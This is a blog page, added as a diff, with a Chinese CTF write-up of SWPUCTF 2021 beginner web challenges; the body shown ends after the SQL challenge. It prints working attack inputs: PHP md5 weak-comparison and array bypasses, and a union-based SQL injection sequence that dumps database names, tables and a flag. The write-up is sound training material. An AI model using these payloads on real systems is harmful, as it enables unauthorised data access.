@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/me.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/me.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/me.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fishcanf1y.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="[SWPUCTF 2021 新生赛]gift_F12Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可 [SWPUCTF 2021 新生赛]jicao12345678&lt;?phphighlight_file(&#x27;index.php&#x27;);include(&quot;flag.php&quot;);$id&#x3D;$_POST[&#x27;id&#x27;];$json&#x3D;json_d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SWPUCTF2021新生赛Web刷题记录">
+<meta property="og:url" content="http://fishcanf1y.github.io/2025/07/21/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="fishcanf1yのBlog">
+<meta property="og:description" content="[SWPUCTF 2021 新生赛]gift_F12Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可 [SWPUCTF 2021 新生赛]jicao12345678&lt;?phphighlight_file(&#x27;index.php&#x27;);include(&quot;flag.php&quot;);$id&#x3D;$_POST[&#x27;id&#x27;];$json&#x3D;json_d">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-2.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-3.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-4.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-sql-2.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-sql-3.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-sql-4.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-include-1.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-include-2.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-include-3.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-easyrce-1.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-easyrce-2.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-http-1.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-http-2.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-http-3.png">
+<meta property="og:image" content="http://fishcanf1y.github.io/images/SWPUCTF-http-4.png">
+<meta property="article:published_time" content="2025-07-21T10:59:46.000Z">
+<meta property="article:modified_time" content="2025-07-28T04:57:49.165Z">
+<meta property="article:author" content="fishcanf1y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fishcanf1y.github.io/images/SWPUCTF-Web-2.png">
+
+
+<link rel="canonical" href="http://fishcanf1y.github.io/2025/07/21/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://fishcanf1y.github.io/2025/07/21/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","path":"2025/07/21/SWPUCTF2021新生赛Web刷题记录/","title":"SWPUCTF2021新生赛Web刷题记录"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SWPUCTF2021新生赛Web刷题记录 | fishcanf1yのBlog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">fishcanf1yのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-gift-F12"><span class="nav-number">1.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]gift_F12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-jicao"><span class="nav-number">2.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]jicao</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-md5"><span class="nav-number">3.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]easy_md5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%95%B0%E7%BB%84%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="nav-number">3.0.1.</span> <span class="nav-text">1.数组漏洞绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-PHP%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="nav-number">3.0.2.</span> <span class="nav-text">2.PHP弱比较</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-sql"><span class="nav-number">4.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]easy_sql</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E7%82%B9"><span class="nav-number">4.0.1.</span> <span class="nav-text">确定回显点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%87%BA%E5%AD%97%E6%AE%B5%E6%95%B0%E4%B8%BA3"><span class="nav-number">4.0.2.</span> <span class="nav-text">判断出字段数为3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE%E7%82%B9"><span class="nav-number">4.0.3.</span> <span class="nav-text">查看回显点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="nav-number">4.0.4.</span> <span class="nav-text">查看数据库信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D%E5%92%8C%E7%94%A8%E6%88%B7%E5%90%8D"><span class="nav-number">4.0.5.</span> <span class="nav-text">查询库名和用户名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E7%9F%A5%EF%BC%8C%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E4%B8%BAtest-db"><span class="nav-number">4.0.6.</span> <span class="nav-text">可知，当前数据库名为test_db</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BE%97%E7%9F%A5%E7%9B%AE%E5%89%8D%E7%94%A8%E6%88%B7%E6%98%AFroot-%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E4%BB%BB%E6%84%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="nav-number">4.0.7.</span> <span class="nav-text">得知目前用户是root 可以查看任意数据库信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E8%A1%A8"><span class="nav-number">4.0.8.</span> <span class="nav-text">爆表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bflag%E8%A1%A8%E5%86%85%E5%AE%B9"><span class="nav-number">4.0.9.</span> <span class="nav-text">查看flag表内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-include"><span class="nav-number">5.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.1.</span> <span class="nav-text">PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter"><span class="nav-number">5.1.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyrce"><span class="nav-number">6.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]easyrce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-caidao"><span class="nav-number">7.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]caidao</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http"><span class="nav-number">8.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]Do_you_know_http</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fishcanf1y"
+      src="/images/me.jpg">
+  <p class="site-author-name" itemprop="name">fishcanf1y</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fishcanf1y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fishcanf1y" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:iszhenghailin@gmail.com" title="E-Mail → mailto:iszhenghailin@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/fishcanf1y_" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;fishcanf1y_" rel="noopener me" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/fishcanf1y" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fishcanf1y" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://securenexuslab.github.io/" title="https:&#x2F;&#x2F;SecureNexusLab.github.io" rel="noopener" target="_blank">SecureNexusLab</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://fishcanf1y.github.io/2025/07/21/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/me.jpg">
+      <meta itemprop="name" content="fishcanf1y">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fishcanf1yのBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SWPUCTF2021新生赛Web刷题记录 | fishcanf1yのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SWPUCTF2021新生赛Web刷题记录
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-07-21 18:59:46" itemprop="dateCreated datePublished" datetime="2025-07-21T18:59:46+08:00">2025-07-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-07-28 12:57:49" itemprop="dateModified" datetime="2025-07-28T12:57:49+08:00">2025-07-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="SWPUCTF-2021-新生赛-gift-F12"><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h2><p>Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可</p>
+<h2 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码审计，以post方式传<code>id=wllmNB</code>和以get方式传<code>json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</code>即可</p>
+<h2 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;flag2.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">wrong!</span><br></pre></td></tr></table></figure>
+
+<p>要求：<code>name</code>的值不等于<code>password</code>的值且其md5后相等</p>
+<p>两种方法：</p>
+<h4 id="1-数组漏洞绕过"><a href="#1-数组漏洞绕过" class="headerlink" title="1.数组漏洞绕过"></a>1.数组漏洞绕过</h4><p><img src="/images/SWPUCTF-Web-2.png" alt="图一展示了利用数组漏洞以进行绕过"></p>
+<p>原理：PHP md5函数接收的参数为string（字符串型），如果传入arry（数组型）就无法计算其md5值，但不会报错，导致数组md5值都相等</p>
+<h4 id="2-PHP弱比较"><a href="#2-PHP弱比较" class="headerlink" title="2.PHP弱比较"></a>2.PHP弱比较</h4><p><img src="/images/SWPUCTF-Web-3.png" alt="图二展示了利用PHP弱比较以进行绕过"></p>
+<p>原理：PHP在进行“&#x3D;&#x3D;”（弱类型比较）时，会先转换字符串类型，再进行字符串比较，而进行md5后以0e开头的都会被PHP识别为科学计数法，即<code>0e*</code>被视作0的<code>*</code>次方，结果都为0，故我们只需找到md5后为<code>0e*</code>的字符串，常用md5后为<code>0e*</code>的有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">字符串         对应md5值</span><br><span class="line"></span><br><span class="line">240610708      0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">QLTHNDT       0e405967825401955372549139051580</span><br><span class="line"></span><br><span class="line">QNKCDZO      0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">PJNPDWY       0e291529052894702774557631701704</span><br><span class="line"></span><br><span class="line">NWWKITQ      0e763082070976038347657360817689</span><br><span class="line"></span><br><span class="line">NOOPCJF       0e818888003657176127862245791911</span><br><span class="line"></span><br><span class="line">MMHUWUV    0e701732711630150438129209816536</span><br><span class="line"></span><br><span class="line">MAUXXQC     0e478478466848439040434801845361</span><br></pre></td></tr></table></figure>
+
+<p>注：以上字符串要记得两个及两个以上，对应md5值不用记</p>
+<h2 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h2><p><img src="/images/SWPUCTF-Web-4.png" alt="图三展示了题目中给的提示和一个很大只的杰哥"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/SWPUCTF-Web-sql-2.png" alt="图四展示了开始猜字段"></p>
+<h4 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="判断出字段数为3"><a href="#判断出字段数为3" class="headerlink" title="判断出字段数为3"></a>判断出字段数为3</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; order by 3 --+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="查看回显点"><a href="#查看回显点" class="headerlink" title="查看回显点"></a>查看回显点</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="查看数据库信息"><a href="#查看数据库信息" class="headerlink" title="查看数据库信息"></a>查看数据库信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, @@version --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SWPUCTF-Web-sql-3.png" alt="图五展示了通过sql注入查看数据库信息"></p>
+<p>MariaDB数据库管理系统是MySQL的一个分支，说明需要使用mysql语句注入</p>
+<h4 id="查询库名和用户名"><a href="#查询库名和用户名" class="headerlink" title="查询库名和用户名"></a>查询库名和用户名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, database() --+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="可知，当前数据库名为test-db"><a href="#可知，当前数据库名为test-db" class="headerlink" title="可知，当前数据库名为test_db"></a>可知，当前数据库名为test_db</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, user() --+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="得知目前用户是root-可以查看任意数据库信息"><a href="#得知目前用户是root-可以查看任意数据库信息" class="headerlink" title="得知目前用户是root 可以查看任意数据库信息"></a>得知目前用户是<code>root</code> 可以查看任意数据库信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p>发现有两个表，test_tb和users</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有<code>flag</code>表</p>
+<h4 id="查看flag表内容"><a href="#查看flag表内容" class="headerlink" title="查看flag表内容"></a>查看<code>flag</code>表内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2, group_concat(flag) from test_tb --+</span></span><br></pre></td></tr></table></figure>
+
